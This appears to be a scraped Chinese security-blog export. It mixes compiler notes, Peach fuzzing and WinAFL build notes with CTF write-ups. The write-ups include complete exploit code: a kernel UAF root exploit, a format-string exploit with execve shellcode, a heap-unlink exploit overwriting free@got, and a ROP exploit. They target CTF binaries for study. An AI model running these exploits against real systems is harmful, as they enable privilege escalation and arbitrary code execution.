TRETURN expr { $$ = new NReturnStatement(*$2); } ;block : TLBRACE stmts TRBRACE { $$ = $2; } | TLBRACE TRBRACE { $$ = new NBlock(); } ;var_decl : ident ident { $$ = new NVariableDeclaration(*$1, *$2); } | ident ident TEQUAL expr { $$ = new NVariableDeclaration(*$1, *$2, $4); } ;extern_decl : TEXTERN ident ident TLPAREN func_decl_args TRPAREN { $$ = new NExternDeclaration(*$2, *$3, *$5); delete $5; } ;func_decl : ident ident TLPAREN func_decl_args TRPAREN block { $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; } ; 对表达式、代码块、变量定义，都有对应的语法规则。 作者设计的ast在node.h中，对于不同的语句，对应的ast也不同，这里举例了表达式声明和变量声明的ast设计： 1234567891011121314151617181920212223242526272829303132333435//表达式声明class NExpressionStatement : public NStatement {public: NExpression&amp; expression; NExpressionStatement(NExpression&amp; expression) : expression(expression) { } virtual llvm::Value* codeGen(CodeGenContext&amp; context);};//变量声明，两个构造方法。//类型 变量名//类型 变量名 = 初始值class NVariableDeclaration : public NStatement {public: const NIdentifier&amp; type; NIdentifier&amp; id; NExpression *assignmentExpr; NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id) : type(type), id(id) { assignmentExpr = NULL; } NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) : type(type), id(id), assignmentExpr(assignmentExpr) { } virtual llvm::Value* codeGen(CodeGenContext&amp; context);};class NExternDeclaration : public NStatement {public: const NIdentifier&amp; type; const NIdentifier&amp; id; VariableList arguments; NExternDeclaration(const NIdentifier&amp; type, const NIdentifier&amp; id, const VariableList&amp; arguments) : type(type), id(id), arguments(arguments) {} virtual llvm::Value* codeGen(CodeGenContext&amp; context);}; 3.3 代码生成(还在看)这部分如果纯自己做的话，怕是要写好久了，如果使用llvm的话，就快很多。 这部分的代码还在看，要结合llvm的文档来看","link":"/2018/01/20/compiler%E5%AD%A6%E4%B9%A0/"},{"title":"babydriver writeup","text":"0x00:之前国赛的一个Linux kernel pwn，Atum大佬的题目。 简单的来说就是kernel的UAF，怎么利用就仁者见仁，智者见智了。 复杂一点，0ctf knote的思路，喷射tty_struct内核对象，然后利用write方法修改这个内核对象，完成提权，但是要bypass smtp保护，这个需要ROP。 赛后问了出题人，最简单的方法，直接fork，利用write方法改uid去拿root，代码也很短，不需要bypass 那些保护。 方法1的话fp的wp写的很清楚(膜石总+林博士),方法2的话文章后面会放出出题人的exp。 0x01: 出题人的exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;const long long credsize=168;char *dev=&quot;/dev/babydev&quot;;char buf[100];volatile int racestop=0;volatile int releasedone=0;int main(){ int fd1,fd2,ret; char zero[100]={0}; fd1=open(dev,O_RDWR); fd2=open(dev,O_RDWR); printf(&quot;fd1=%d\\n fd2=%d\\n&quot;,fd1,fd2); ret=ioctl(fd1,0x10001,credsize); printf(&quot;ioctl in main =%d\\n&quot;,ret); close(fd1); int t=1000; int pid=fork(); if(pid&lt;0){ puts(&quot;error,pid&lt;0&quot;); return 0; } if(pid==0){ ret=write(fd2,zero,28); printf(&quot;write in writebuf=%d\\n&quot;,ret); t=getuid(); printf(&quot;uid=%d\\n&quot;,t); if(t==0){ system(&quot;/bin/sh&quot;); exit(0); } else{ exit(0); } } else{ wait(NULL); } close(fd2); return 0;}","link":"/2017/07/13/babydriver-writeup/"},{"title":"crbug1051017 exploit","text":"about最近看到crbug 1051017公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。 how2exploit因为glazunov的poc已经做到了oob array阶段了，所以通过布局一个BigUint64Array来任意地址读写即可，即利用方式参考CVE-2020-6418就可以了。 full exploitexploit referencecrbug 1051017browser-pwn-cve-2020-6418漏洞分析","link":"/2020/06/05/crbug1051017-exploit/"},{"title":"exploit for crbug1086890","text":"bug info来自pj0的glazunov的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。 exploit比较不好的地方就是需要大概猜一下那个oobarray的elements的地址，使得我们想用来aar/w的array或者arraybuffer落在这后面，大概调整个偏移使得能够正常读写到就行。 测试版本:83.0.4103.61 1234567Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048beBranch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514Branch Base Position: 756066V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480afV8 Version: 8.3.110.9V8 Position: 19Skia Commit: c3d05a789930913af94174961bc6f90894196f62 调试会比较麻烦点，gdb 直接起触发有问题（我这里是），我是开了coredump，然后触发crash看看内存啥的调的。 biguint64 还是 arraybuffer都行，喜欢啥用啥。 想成功率高，要用web worker（我觉得），要么死猜几个地址，要么随机撞大运。 完整利用代码 觉得有用的朋友可以打赏一杯☕️ :)","link":"/2020/08/27/exploit-for-crbug1086890/"},{"title":"find macOS service and it&#39;s plist file","text":"0x00:find macOS service ‘s plist file. com.apple.xxxx —&gt; xxxx.plist 0x01 :find all *.plist file and use grep to find target service, not the best way. 0x02 :use procexp. 1./procexp.universal all ports | service_name 0x03 :this way is more complex than others, thx to brightiup :) step 1 write a simple gadget, core logic as follow: 12345bootstrap_look_up(bs_port, render_service_name, &amp;p);...mach_msg(&amp;m.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(message), 0, 0, 0, 0);...getchar(); //do not exit untill we finish step 2 get the pid of your gadget Step 3 1sudo lsmp -p pid now, you can get the service name according to mach port, then find the plist file by service name you found.","link":"/2019/06/14/find-macOS-service-and-it-s-plist-file/"},{"title":"format string with stack frame","text":"0x00:写在前面格式化字符串漏洞出现的时间很早了，偶然在前一段时间学到了一个其他的利用姿势，通过栈桢结构去利用格式化字符串漏洞。原文链接 0x01:原理在函数调用的时候，会开辟一段空间去给当前函数使用，做法是通过抬高栈来实现(sub esp,0x**)，为了执行函数后能正确的返回，栈基指针ebp是指向上一个函数的ebp的，也就是被调用函数ebp指向调用函数ebp。 大概的样子就如图了，简单的写一个demo就可以发现这个。 对于格式化字符串来说，本质还是任意地址的读写，可以用来修改got、ret_addr去控制程序流程，还可以 多次利用格式串，把shellcode一个字节一个字节写到一个w+x的内存地址去，然后修改got跳过去执行。 但是如果格式化字符串不在栈中呢？如果不在栈中，那么就不能通过 %*$ 这样的方式去定位，增大了利用难度，在看了phrack的文章，了解到了一种姿势：假如要把 sleep@got修改成 system@got，可以先利用格 式串把sleep@got先写到当前ebp指向，然后再次利用，把这个改掉，因为都是在 got表中，所以只需要改最后两个字节(x86)。 这样的话就实现了 不在栈中格式串的利用了。 0x02：实例拿plaidctf-2015的一个pwn来演示。 bin文件的基本信息如图，分别运行和在ida中分析。明显的FSB在 make_response 函数中。 但是，用户的输入是在 0804A040 这个地址，这个地址是在.bss段的(栈中看不到，但是好处是不随机) 思路大概就是，把shellcode放在这个地方，然后修改 make_response 的ret addr 到这个地址去，然后就可以拿到shell了。 1. leak 栈地址 找到ret addr 2. 写到上一个ebp去 3. 修改ret addr 到 0804A040 0x03:exp1234567891011121314151617181920212223242526#!/usr/bin/python#--by muhe--from zio import *#target='./ebp'target = ('127.0.0.1',10001)io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))shellcode = (\"\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\" \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\" \"\\x5b\\x52\\x53\\x54\\x59\\x0f\\x34\")vuln_addr =0x0804a480#leak stack addrio.writeline('%4$p')#raw_input()leak_addr = int(io.read_until('\\n'),16)ret_addr = (leak_addr-0x1c) &amp; 0xffffprint ret_addr#overwrite#raw_input()p1 = \"%\"+str(ret_addr)+\"x%\"+str(4)+\"$hn\"io.writeline(p1)io.read_until('\\n')#get shell##raw_input()p2 = shellcode+\"%\"+str((vuln_addr &amp; 0xffff)-len(shellcode))+\"x%\"+str(12)+\"$hn\"io.writeline(p2)io.interact() 0x04:参考 phrack geeksspeak","link":"/2015/12/02/format-string-with-stack-frame/"},{"title":"heap vuln -- unlink","text":"0x00:起因一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。 0x01:关于heap的unlink的漏洞利用，出的很早，在低版本的libc中，因为没有校验，导致在unlink的时候可以通过构造堆块dwordshoot，从而任意代码执行。对于这种漏洞的学习，首先要了解malloc的工作原理及几种堆块的分配、使用方式。推荐文章 Understanding glibc malloc 0x02:文件信息 0x03:分析程序是一个菜单式的程序，可以用户自定义分配块的长度和内容，漏洞在于：edit的时候，没做长度校验导致可以溢出，通过构造可以bypass 在libc中unlink的校验，从而getshell。 0x04:在drops看到的姿势堆溢出的unlink利用方法按照文中给出的方式，为了bypass 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))4malloc_printerr (check_action, \"corrupted double-linked list\", P); 这么一个指针的校验，我们找到一个特殊的 指针ptr是指向p的(p指向堆)那么可以根据p去构造bk和fd两个指针 1234567891011chunk0 malloc返回的ptr chunk1 malloc返回的ptr| | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+| | |fake|fake|fake|fake| D | fake | fake | | | || | |prev|size| FD | BK | A | prev | size&amp;| | | || prev_size |size&amp;Flag|size| | | | T | size | flag | | | || | | | | | | A | | | | | || | | | | | | | | | | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+ |--------new_size--------| list 123456l32(0) + l32(0x89) + l32(list-0xc) + l32(list-0x8) +\"A\"*(128-4*4)#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA# 4bytes 4bytes 4bytes 4bytes 128-4*4#pre_size + size&amp;flagl32(0x80) + l32(0x88)free(chunk_1) 分配两个长度合适的块，伪造第一个块，然后通过修改了第二个块的pre_size 和size然后free(chunk1) 触发unlink 之后再次修改指针p 从而达到leak地址，修改地址的目的 0x05:exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *context.update(os='linux', arch='i386')p = remote('127.0.0.1',10001)chunk_list = 0x8049d60free_got = 0x8049ce8flag = 0def leak(addr): data = \"A\" * 0xc + p32(chunk_list-0xc) + p32(addr) global flag if flag == 0: set_chunk(0, data) flag = 1 else: set_chunk2(0, data) res = \"\" p.recvuntil('5.Exit\\n') res = print_chunk(1) print(\"leaking: %#x ---&gt; %s\" % (addr, res[0:4].encode('hex'))) return res[0:4]def add_chunk(len):4print p.recvuntil('\\n')4p.sendline('1')4print p.recvuntil('Input the size of chunk you want to add:')4p.sendline(str(len))def set_chunk(index,data):4p.recvuntil('5.Exit\\n')4p.sendline('2')4p.recvuntil('Set chunk index:')4p.sendline(str(index))4p.recvuntil('Set chunk data:')4p.sendline(data)def set_chunk2(index, data): p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.sendline(data)def del_chunk(index):4p.recvuntil('\\n')4p.sendline('3')4p.recvuntil('Delete chunk index:')4p.sendline(str(index))def print_chunk(index):4p.sendline('4')4p.recvuntil('Print chunk index:')4p.sendline(str(index))4res = p.recvuntil('5.Exit\\n')4return resraw_input('add_chunk')add_chunk(128) #0add_chunk(128) #1add_chunk(128) #2add_chunk(128) #3set_chunk(3, '/bin/sh')#fake_chunkpayload = \"\"payload += p32(0) + p32(0x89) + p32(chunk_list-0xc) + p32(chunk_list-0x8)payload += \"A\"*(0x80-4*4)#2nd chunk payload += p32(0x80) + p32(0x88)set_chunk(0,payload)#get the pointerdel_chunk(1)set_chunk(0, 'A' * 12 + p32(0x8049d54) + p32(0x8049d14))raw_input('leak')#leak system_addrpwn_elf = ELF('./heap')d = DynELF(leak, elf=pwn_elf)sys_addr = d.lookup('system', 'libc')print(\"system addr: %#x\" % sys_addr)raw_input('edit free@got')data = \"A\" * 12 + p32(chunk_list-0xc) + p32(free_got)set_chunk2('0', data)set_chunk2('1', p32(sys_addr))del_chunk('3')p.interactive()p.close() 0x06:参考 Understanding glibc malloc 堆溢出的unlink利用方法 最后还要感谢chxx大表哥的pwn和指导=。= 所有文件都在这里了 文件下载","link":"/2016/02/15/heap-vuln-unlink/"},{"title":"fuzzing with peach(Just a toy)","text":"0x00: 前言之前学习过peach的使用，在willj师傅的指导下尝试去fuzz了某播放器，只是个尝试，并没有更深入去搞(本来的计划是结合winafl的)，虽然没啥产出，但是fuzz过程还算清晰。过程中实现了自动化的fuzz脚本，有完整的功能，就是效率堪忧-。- 0x01: 关于peachpeach是一款优秀的文件格式fuzz工具。peach是基于模板变异工作的，而且开源，文档虽然不是那么多，但是自己多摸索、学习还是可以学会一些基本的用法的。我在看使用peach做文件fuzz相关的资料的时候，最开始看的《0day2》里作者给的例子，从编写pit file到fuzz跑起来；之后看了一份国际友人写的Fuzzing with Peach – Part 1 « Flinkd!，他这篇文章写的非常好，几乎涵盖了peach 90%的语法，仔细阅读，自己动手实践，会很快入门pit file的编写。 0x02: 文件fuzz的思路fuzz嘛，简单的来看就是 构造输入 传给目标程序 程序状态检测(是否crash) 做log 之后根据你的log，把有用的样本拿出来在分析。我的想法也很简单，就是利用peach基于我给的一个小文件，生成很多样本，然后写自动化的脚本去fuzz，并且做好异常检测的工作。我的目标是adobe flash player sa版本，刚开始尝试就做一点简单的，选择flv文件作为fuzz的点。下面的问题就是： flv文件格式 根据文件格式编写pit file 如何加载我的fuzz.flv文件？ 异常检测怎么做 下面慢慢来分析。 flv文件格式flv文件主要分为header和body两个部分。 header部分1234第1-3字节：文件标志，FLV的文件标志为固定的“FLV&quot;，字节（0x46， 0x4C，0x56），见上面的字节序和字符序两行；第4字节：当前文件版本，固定为1（0x01）第5字节：此字节当前用到的只有第6，8两个bit位，分别标志当前文件是否存在音频，视频。参见上面bit序，即是第5字节的内容；第6-9字节：此4字节共同组成一个无符号32位整数（使用大头序），表示文件从FLV Header开始到Flv Body的字节数，当前版本固定为9（0x00，0x00，0x00，0x09） body部分这部分其实就是很多的tag的组合。不过tag的种类有三种，分别是script、Audio、Video。每种tag的tag data又各不相同，详细的可以看一些文档了解。 123456789101112131415-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |------------------------- 一些参考的文档flv文件格式详解，以及是官方的flv格式相关的文档都可以。 根据文件格式编写pit file了解了文件格式之后就是编写pit file了，困难的地方可能就在于tag结构，因为数目不确定，而且相互之间有联系，比如某个bit为1或者0，影响着后面的某个结构的有无。我的做法是，我使用类似Switch case这样的结构，让peach自己去判断选择对应的结构，即我写三种tag，然后限定最大的出现次数，因为样本很小，几百个最多了，然后peach根据模板文件的tag的标志，找到我pit file里对应的tag的结构，然后根据pit file里的结构进行变异，然后生成新的样本。这里可以集合010 editor的二进制模板功能，可以对比你生成的样本是否正确，方便调试。 如何加载我的fuzz.flv文件？有了样本，下面的问题就是怎么加载样本然后播放了。flash并不直接打开flv文件，而是使用swf来加载，所以我需要用as语言来编写一个swf来加载。这时候就有又一个问题：swf要编译的，即我的文件名会写死，这时候就麻烦了。不过这个也好解决，我可以在后续的fuzz脚本中，每次单独复制一个样本到工作目录，然后重命名为swf要加载的文件的名字，然后起flash，加载swf，然后做后续的工作；完成之后，循环这个工作。这样就可以很好的解决这个问题了。 异常检测怎么做我觉得最简单的办法就是调试器了，如果你进程崩了，你的just in time debugger会启动，问你要不要调试，你检测进程就可以了，然后做log，杀了所有进程，继续下一轮fuzz就好了。缺点很明显，这方法贼搓，而且效率低的要死，刚开始搞嘛，凑合用咯。 0x03: 编写pit file首先是针对flv header的部分的编写 1234567891011&lt;DataModel name=&quot;flvHeader&quot;&gt; &lt;String name=&quot;flv_Signature&quot; value=&quot;464C5601&quot; valueType=&quot;hex&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Flags name=&quot;HeadFlags&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;dummy&quot; position=&quot;3&quot; size=&quot;5&quot;/&gt; &lt;Flag name=&quot;audio&quot; position=&quot;2&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;dummy2&quot; position=&quot;1&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;video&quot; position=&quot;0&quot; size=&quot;1&quot;/&gt; &lt;/Flags&gt; &lt;Number name=&quot;dataoffset&quot; value=&quot;9&quot; size=&quot;32&quot;/&gt; &lt;Number name=&quot;zero&quot; size=&quot;32&quot;/&gt;&lt;/DataModel&gt; 这部分是script tag部分的编写 12345678910&lt;Block name=&quot;script&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;18&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;firstbyte&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Blob name=&quot;data2&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize').getInternalValue())-1&quot;/&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; 这部分是audio tag部分的编写 1234567891011121314151617181920212223&lt;Block name=&quot;audio&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;8&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize1&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Flags name=&quot;Flag3&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;fmt&quot; position=&quot;0&quot; size=&quot;4&quot;/&gt; &lt;Flag name=&quot;sr&quot; position=&quot;4&quot; size=&quot;2&quot;/&gt; &lt;Flag name=&quot;bits&quot; position=&quot;6&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;channels&quot; position=&quot;7&quot; size=&quot;1&quot;/&gt; &lt;/Flags&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag3.fmt').getInternalValue()) == 10&quot;/&gt; &lt;Blob name=&quot;frmtype&quot; length=&quot;1&quot;/&gt; &lt;Blob name=&quot;data1&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize1').getInternalValue())-2&quot;/&gt; &lt;/Block&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag3.fmt').getInternalValue()) != 10&quot;/&gt; &lt;Blob name=&quot;data1&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize1').getInternalValue())-1&quot;/&gt; &lt;/Block&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; 这部分是video tag的部分的编写 12345678910111213141516171819202122&lt;Block name=&quot;video&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;9&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize2&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Flags name=&quot;Flag2&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;frmtype&quot; position=&quot;0&quot; size=&quot;4&quot;/&gt; &lt;Flag name=&quot;codecid&quot; position=&quot;4&quot; size=&quot;4&quot;/&gt; &lt;/Flags&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag2.codecid').getInternalValue()) == 7&quot;/&gt; &lt;Blob name=&quot;pkttype&quot; length=&quot;1&quot;/&gt; &lt;Blob name=&quot;compotime&quot; length=&quot;3&quot;/&gt; &lt;Blob name=&quot;data&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize2').getInternalValue())-5&quot;/&gt; &lt;/Block&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag2.codecid').getInternalValue()) != 7&quot;/&gt; &lt;Blob name=&quot;data&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize2').getInternalValue())-1&quot;/&gt; &lt;/Block&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; 0x04: swf加载样本利用as语言编写的代码，编译后得到swf文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package{ import flash.display.Sprite; import flash.net.*; import flash.media.*; import flash.utils.*; import flash.display.* import flash.events.*; import flash.system.fscommand; import flash.display3D.textures.VideoTexture; public class Main extends Sprite { public function Main():void { var video:Video; var netCon:NetConnection; var stream:NetStream; function loadVideo(url:String):Video { video = new Video(); netCon = new NetConnection(); netCon.connect(null); stream = new NetStream(netCon); stream.play(url); var client:Object = new Object(); client.onMetaData = onMetaEvent; stream.client = client; stream.addEventListener(NetStatusEvent.NET_STATUS, netStatus); video.attachNetStream(stream); return video; } function onMetaEvent(e:Object):void { } function netStatus(e:NetStatusEvent):void { video.width = stage.stageWidth; video.height = stage.stageHeight; } stage.addChild(loadVideo(&quot;fuzz.flv&quot;)); } }} 0x05: 自动化fuzz脚本核心部分的代码如下。 1234567def run(fileID): copyFile(fileID) subprocess.Popen(runCmd) #sleep(2) checkCrash() #sleep(1) clean() 首先会拷贝一个样本文件到工作目录 12def copyFile(fileID): shutil.copyfile(fileDict.get(fileID),workDir+&quot;fuzz.flv&quot;) 然后开始一轮的fuzz 1234fuzzFilename = &quot;fuzz.swf&quot;programName = &quot;flashplayer_22_sa_debug.exe&quot;runCmd = programName +&quot; &quot;+ fuzzFilenamesubprocess.Popen(runCmd) 然后是异常检测(贼搓的方法…TAT) 123456789101112131415def checkCrash(): winDbg = &quot;windbg.exe&quot; #get process list try: processList = psutil.process_iter() except Exception as e: print e for p in processList: if(p.name == winDbg): print &quot;[#]Crash Found! Writing to log now ...&quot; log(fileID) sleep(1) p.kill() else: pass 最后就是收尾的工作了 12345def clean(): subprocess.Popen(killProgram)#kill programName for next one sleep(1) if(os.path.exists(workDir+&quot;fuzz.flv&quot;)): os.remove(workDir+&quot;fuzz.flv&quot;) 0x06: 结束语我这个东西只能叫toy吧，效率低下，简单粗暴。但是过程中是学习到不少东西，之后的打算是多看一些论文，多学习一些漏洞挖掘的方法，之前尝试了结合winafl来搞，不过问题很多，有待解决…慢慢来吧。所有的东西我都丢github了，有啥错误欢迎各位师傅留言/email指导我 传送门在这里：fuzz with peach 0x07: 参考flv文件格式详解peach 文档Fuzzing with Peach – Part 1 « Flinkd!","link":"/2016/12/17/fuzzing-with-peach-Just-a-toy/"},{"title":"how to compile WinAFL","text":"0x00: 前言以前给自己挖了好多坑，结果就是现在要一个一个填，比如winafl的改造，需要重新编译，按照github上给出的方案编译遇到了问题，之后填了这个坑，这段时间又接触了相关的东西，就把这些东西拿出来记录一下，方便以后自己查看。 0x01: 遇到的问题之前的测试环境： windows 10 x64 vs 2015 编译的方法： For a 32-bit build: 1234mkdir build32cd build32cmake .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmakecmake --build . --config Release For a 64-bit build: 1234mkdir build64cd build64cmake -G&quot;Visual Studio 10 Win64&quot; .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmakecmake --build . --config Release 不过要注意，DR的路径一定要是绝对路径。 然后遇到了这样的问题 一堆的链接错误…. 出现这样的问题是因为你vs版本的问题，用2010就可以了。 0x02: 正确的姿势首先上测试环境: windows7 x64 vs2010 按照之前的方法编译，遇到了这样的一个问题。 这个是因为是VS用来进行COFF格式转换的工具cvtres.exe被破坏了。 12cvtres.exe被破坏的原因是因为我刚装了.Net Framework，.Net Framework 自带了一个更新的cvtres.exe，却让原来VS2010中的cvtres.exe动不起来了。并且在VS编译时，VS自带的cvtres.exe在PATH环境变量的前面，所以COFF转换失败。知道原因就很好解决了:把VS2010中的两个cvtres.exe删掉或改名字，让VS可以使用.Net Framework 4.5安装的cvtres.exe，就OK了。 再次编译 搞定了32位的编译，之后是64位的 0x03 : 结束语现在已经可以编译了，也可以用vs调试了，这样就可以开始愉快的winafl改造工作了吧~","link":"/2016/10/29/how-to-compile-WinAFL/"},{"title":"ichunqiu-CTF-2017-2","text":"0x00事后复现的，一些技巧也是第一次遇到。 Black_hole1.vuln主函数 1234567void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ alarm(0x60u); while ( check(96LL, a2) == 2333 ) vuln(); sub_4006F6();} 漏洞函数，栈溢出。 123456size_t vuln(){ char ptr; // [sp+0h] [bp-10h]@1 return fread(&amp;ptr, 1uLL, 32uLL, stdin);} 2.tips不断ret到main函数，循环读取输入，写完payload之后，ret到ret这个gadgets，去执行ROP。因为是动态链接x64的程序，所以ROP构造直接使用通型gadgets去构造。程序没有leak，开始我的思路是读取很多，去使用ret2dlresolve的思路去搞，没搞好…后来看了作者分享的exp，才发现可以：覆盖alarm@got最后一字节，爆破的手段，找到syscall…然后就是布置好寄存器，起shell了。 3.exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level = 'debug'context.arch='amd64'LOCAL = Falseif LOCAL: p = process('black_hole')else: #p = remote('127.0.0.1',10001) p = remote(&quot;106.75.66.195&quot;,11003)main_addr = 0x0000000000400704token = 2333def write_stack(data): p.sendline(str(token)) sleep(1) payload = data.rjust(0x18,'A') + p64(main_addr) sleep(1) p.send(payload)gadget_1 = 0x00000000004007A6gadget_2 = 0x0000000000400790 addr_got_read = 0x0000000000601028addr_bss = 0x000000000601058addr_got_alarm = 0x0000000000601020def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0,Flag=True): if Flag: pl = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret pl += p64(0) # for junk pl += p64(0x0) # rbx be 0x0 pl += p64(0x1) # rbp be 0x1 pl += p64(jmp2) # r12 jump to pl += p64(arg3) # r13 -&gt; rdx arg3 pl += p64(arg2) # r14 -&gt; rsi arg2 pl += p64(arg1) # r15 -&gt; edi arg1 pl += p64(part2) # part2 entry will call [rbx + r12 + 0x8] return pl else: pl = p64(0) # for junk pl += p64(0x0) # rbx be 0x0 pl += p64(0x1) # rbp be 0x1 pl += p64(jmp2) # r12 jump to pl += p64(arg3) # r13 -&gt; rdx arg3 pl += p64(arg2) # r14 -&gt; rsi arg2 pl += p64(arg1) # r15 -&gt; edi arg1 pl += p64(part2) # part2 entry will call [rbx + r12 + 0x8] return plpayload = com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_got_alarm,arg3=1)payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_bss,arg3=0x3B,Flag=False)payload += com_gadget(gadget_1,gadget_2,addr_bss+8,arg1=addr_bss,arg2=0x0,arg3=0x0,Flag=False)def main(): print payload for i in xrange(len(payload), 0, -8): print i write_stack(payload[i-8:i]) sleep(1) raw_input('0x00000000004006F5 ') p.sendline(str(token)) p.send(&quot;A&quot;*0x18 + p64(0x00000000004006CB)) sleep(1) off = 5 p.send(str(off)) # ovwer write one byte sleep(1) payload2 = &quot;/bin/sh\\x00&quot; payload2 += p64(0x0000000000400540) payload2 += (0x3B - len(payload2) - 1) * &quot;A&quot; p.sendline(payload2) p.interactive()if __name__ == '__main__': main() fast-fast-fast [未完成]1.vulnfastbin的利用，目标就是控制fd指针，然后分配到自己想要的地址，正好全局指针都在.bss。程序的漏洞是double free。 123456789__int64 __fastcall delet(__int64 ptr){ __int64 result; // rax@1 free(*(_QWORD *)(ptr + 16)); result = ptr; *(_QWORD *)ptr = 0LL; // set flag 0 return result;} 2.tips利用过程： 分配一个fastbin，然后释放掉 分配一个smallbin，然后释放fastbin(其实这里释放的是smallbin) 再次分配刚才释放掉的块(fastbin的菜单里) 编辑释放块，这里要伪造chunk 调用saysercrt()分配fastbin 分配的想要的块(得到一个.bss上的指针) 之后利用edit功能，可以完成任意地址读写 不过要注意的是，程序静态链接的…所以为了得到一个任意地址读，选择覆盖.bss:00000000006C3750 __free_hook dq ? ; DATA XREF: 